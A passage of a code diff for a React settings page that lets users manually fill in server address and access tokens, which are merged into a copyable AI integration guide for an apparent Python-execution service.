+  ['project_dir', '项目目录', '客户端自动获取，获取不到时手填'],
+  ['ai_client', 'AI 客户端路径', 'clients/ai/client_ai.py'],
+  ['human_token', 'Human Token', '填写 Human Token'],
+  ['ai_worker_token', 'AI Worker Token', '填写 AI Worker Token'],
+  ['ai_approval_token', 'AI Approval Token', '填写 AI Approval Token'],
+]
+
+function loadGuideOverrides() {
+  try { return JSON.parse(localStorage.getItem('pyexec_ai_guide_context') || '{}') || {} } catch { return {} }
+}
+
 function renderAIGuide(template, context) {
   const values = { ...AI_GUIDE_DEFAULT }
   for (const [key, value] of Object.entries(context || {})) values[key.toUpperCase()] = String(value ?? '')
@@ -1780,11 +1960,12 @@ function renderAIGuide(template, context) {
 
 function AIGuide() {
   const [context, setContext] = useState(null)
+  const [overrides, setOverrides] = useState(loadGuideOverrides)
   const [loadMsg, setLoadMsg] = useState('')
   const [template, setTemplate] = useState(() => localStorage.getItem('pyexec_ai_guide_template') || AI_GUIDE_TEXT)
   const [draft, setDraft] = useState(template)
   const [editing, setEditing] = useState(false)
-  const [markdownMode, setMarkdownMode] = useState(false)
+  const [markdownMode, setMarkdownMode] = useState(true)
   const [saveMsg, setSaveMsg] = useState('')
   useEffect(() => {
     fetch('/api/ai-guide-context', { headers: { 'X-PyExec-Auth': sessionStorage.getItem('pyexec_token') || '' } })
@@ -1792,8 +1973,25 @@ function AIGuide() {
       .then(setContext)
       .catch(err => setLoadMsg(err.message))
   }, [])
-  const text = useMemo(() => renderAIGuide(template, context), [template, context])
+  const mergedContext = useMemo(() => {
+    const merged = { ...AI_GUIDE_DEFAULT, ...(context || {}), ...overrides }
+    try {
+      const url = new URL(String(merged.server_url || merged.SERVER_URL || ''))
+      merged.server_scheme = url.protocol.replace(':', '') || merged.server_scheme
+      merged.server_host = url.hostname || merged.server_host
+      merged.server_port = url.port || (url.protocol === 'https:' ? '443' : '80')
+    } catch { /* keep manually provided values */ }
+    return merged
+  }, [context, overrides])
+  const text = useMemo(() => renderAIGuide(template, mergedContext), [template, mergedContext])
   const markdownText = useMemo(() => text.replace(/^([一二三四五六七八九十]+、.*)$/gm, '## $1'), [text])
+  const updateGuideContext = (key, value) => {
+    const next = { ...overrides, [key]: value }
+    setOverrides(next)
+    localStorage.setItem('pyexec_ai_guide_context', JSON.stringify(next))
+  }
+  const guideValue = (key) => String(overrides[key] ?? context?.[key] ?? AI_GUIDE_DEFAULT[key.toUpperCase()] ?? '')
+  const clearGuideOverrides = () => { setOverrides({}); localStorage.removeItem('pyexec_ai_guide_context'); setSaveMsg('已清空手填动态值，重新使用客户端自动获取值') }
   const startEdit = () => { setDraft(template); setEditing(true); setMarkdownMode(false); setSaveMsg('') }
   const saveEdit = () => { setTemplate(draft); localStorage.setItem('pyexec_ai_guide_template', draft); setEditing(false); setSaveMsg('教程模板已保存') }
   const cancelEdit = () => { setDraft(template); setEditing(false) }
@@ -1802,6 +2000,14 @@ function AIGuide() {
     <header className="page-head"><div><div className="eyebrow">AI INTEGRATION MANUAL</div><h1>AI 教程<span>_</span></h1><p>自动填入当前服务端地址、端口和三类 Token；编辑时显示可替换占位符，保存后自动替换成真实值。</p>{loadMsg && <span className="hint">动态上下文加载失败：{loadMsg}</span>}{saveMsg && <span className="hint">{saveMsg}</span>}</div>
       <div className="ai-guide-actions">{editing ? <><button className="ghost" onClick={resetTemplate}>恢复默认</button><button className="ghost" onClick={cancelEdit}>取消</button><button className="primary" onClick={saveEdit}>保存教程</button></> : <><button className="ghost" onClick={() => setMarkdownMode(prev => !prev)}>{markdownMode ? '显示原文' : 'Markdown 渲染'}</button><button className="ghost" onClick={startEdit}>编辑教程</button><CopyButton text={text}>复制 AI 教程</CopyButton></>}</div>
     </header>
+    <Panel title="动态上下文" eyebrow="AUTO FILL / MANUAL OVERRIDE" right={<button className="ghost" onClick={clearGuideOverrides}>清空手填值</button>}>
+      <div className="ai-guide-context-panel">
+        <div className="ai-guide-context-hint">客户端能获取的字段会自动填入；获取不到的值请在这里手填。修改后教程会实时重新渲染，并保存到本机浏览器。</div>
+        <div className="ai-guide-context-grid">
+          {AI_GUIDE_CONTEXT_FIELDS.map(([key, label, placeholder]) => <label key={key}><span>{label}</span><input value={guideValue(key)} onChange={e => updateGuideContext(key, e.target.value)} placeholder={placeholder} autoComplete="off" spellCheck={false} /></label>)}
+        </div>
+      </div>
+    </Panel>
     <Panel title={editing ? 'AI 对接手册（编辑模板）' : 'AI 对接手册'} eyebrow={editing ? 'TEMPLATE EDITOR / PLACEHOLDERS' : 'COPY-READY PROMPT / DYNAMIC CONTEXT'}>
       {editing ? <><textarea className="ai-guide-editor" value={draft} onChange={e => setDraft(e.target.value)} spellCheck={false} /><div className="ai-guide-placeholder-hint">{`编辑模式只显示原文和占位符：{{SERVER_URL}} {{SERVER_SCHEME}} {{SERVER_HOST}} {{SERVER_PORT}} {{LOCAL_WEB_URL}} {{PROJECT_DIR}} {{AI_CLIENT}} {{HUMAN_TOKEN}} {{AI_WORKER_TOKEN}} {{AI_APPROVAL_TOKEN}}。保存后自动替换。`}</div></> : markdownMode ? <div className="ai-guide-markdown"><ReactMarkdown remarkPlugins={[remarkGfm, remarkBreaks]} components={{ a: ({ node, ...props }) => <a {...props} target="_blank" rel="noreferrer" /> }}>{markdownText}</ReactMarkdown></div> : <pre className="ai-guide-text">{text}</pre>}
     </Panel>
